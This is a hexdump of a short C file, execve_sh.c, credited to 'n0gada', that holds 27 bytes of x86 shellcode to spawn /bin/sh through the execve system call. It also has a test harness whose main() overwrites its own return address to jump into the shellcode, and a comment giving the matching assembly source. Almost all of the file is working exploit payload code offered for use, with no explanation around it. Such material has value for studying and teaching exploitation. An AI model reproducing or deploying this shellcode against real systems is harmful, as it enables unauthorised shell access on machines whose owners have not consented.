00000000  2f 2a 20 65 78 65 63 76  65 5f 73 68 2e 63 20 62  |/* execve_sh.c b|
00000010  79 20 6e 30 67 61 64 61  09 0d 0a 20 20 20 32 37  |y n0gada...   27|
00000020  20 62 79 74 65 73 2e 0d  0a 2a 2f 0d 0a 23 69 6e  | bytes...*/..#in|
00000030  63 6c 75 64 65 20 22 73  74 64 69 6f 2e 68 22 0d  |clude "stdio.h".|
00000040  0a 0d 0a 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |...char shellcod|
00000050  65 5b 5d 3d 0d 0a 22 5c  78 65 62 5c 78 30 64 5c  |e[]=.."\xeb\x0d\|
00000060  78 35 66 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |x5f\x31\xc0\x50\|
00000070  78 38 39 5c 78 65 32 22  0d 0a 22 5c 78 35 32 5c  |x89\xe2".."\x52\|
00000080  78 35 37 5c 78 35 34 5c  78 62 30 5c 78 33 62 5c  |x57\x54\xb0\x3b\|
00000090  78 63 64 5c 78 38 30 5c  78 65 38 22 0d 0a 22 5c  |xcd\x80\xe8".."\|
000000a0  78 65 65 5c 78 66 66 5c  78 66 66 5c 78 66 66 2f  |xee\xff\xff\xff/|
000000b0  62 69 6e 2f 73 68 22 3b  0d 0a 0d 0a 69 6e 74 20  |bin/sh";....int |
000000c0  6d 61 69 6e 28 76 6f 69  64 29 0d 0a 7b 0d 0a 20  |main(void)..{.. |
000000d0  69 6e 74 20 2a 72 65 74  3b 0d 0a 0d 0a 09 70 72  |int *ret;.....pr|
000000e0  69 6e 74 66 28 22 25 64  5c 6e 22 2c 73 74 72 6c  |intf("%d\n",strl|
000000f0  65 6e 28 73 68 65 6c 6c  63 6f 64 65 29 29 3b 09  |en(shellcode));.|
00000100  0d 0a 09 72 65 74 20 3d  20 28 69 6e 74 20 2a 29  |...ret = (int *)|
00000110  26 72 65 74 2b 32 3b 0d  0a 09 2a 72 65 74 20 3d  |&ret+2;...*ret =|
00000120  20 28 69 6e 74 29 73 68  65 6c 6c 63 6f 64 65 3b  | (int)shellcode;|
00000130  0d 0a 0d 0a 72 65 74 75  72 6e 20 30 3b 0d 0a 0d  |....return 0;...|
00000140  0a 7d 0d 0a 0d 0a 2f 2a  2a 2a 2a 2a 2a 2a 2a 2a  |.}..../*********|
00000150  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000170  2a 2a 2a 2a 0d 0a 65 78  65 63 76 65 5f 73 68 2e  |****..execve_sh.|
00000180  73 0d 0a 0d 0a 09 2e 67  6c 6f 62 6c 20 6d 61 69  |s......globl mai|
00000190  6e 0d 0a 09 6d 61 69 6e  3a 0d 0a 09 09 6a 6d 70  |n...main:....jmp|
000001a0  20 73 74 72 69 6e 67 73  0d 0a 09 73 74 61 72 74  | strings...start|
000001b0  3a 0d 0a 09 09 70 6f 70  20 25 65 64 69 0d 0a 09  |:....pop %edi...|
000001c0  09 78 6f 72 6c 20 25 65  61 78 2c 25 65 61 78 0d  |.xorl %eax,%eax.|
000001d0  0a 09 09 70 75 73 68 20  25 65 61 78 0d 0a 09 09  |...push %eax....|
000001e0  6d 6f 76 6c 20 25 65 73  70 2c 25 65 64 78 0d 0a  |movl %esp,%edx..|
000001f0  09 09 70 75 73 68 20 25  65 64 78 0d 0a 09 09 70  |..push %edx....p|
00000200  75 73 68 20 25 65 64 69  0d 0a 09 09 70 75 73 68  |ush %edi....push|
00000210  20 25 65 73 70 0d 0a 09  09 6d 6f 76 62 20 24 30  | %esp....movb $0|
00000220  78 33 62 2c 25 61 6c 0d  0a 09 09 69 6e 74 20 24  |x3b,%al....int $|
00000230  30 78 38 30 0d 0a 0d 0a  09 73 74 72 69 6e 67 73  |0x80.....strings|
00000240  3a 20 63 61 6c 6c 20 73  74 61 72 74 0d 0a 09 09  |: call start....|
00000250  2e 73 74 72 69 6e 67 20  22 2f 62 69 6e 2f 73 68  |.string "/bin/sh|
00000260  22 0d 0a 0d 0a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |"....***********|
00000270  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000290  2a 2a 2f                                          |**/|
00000293
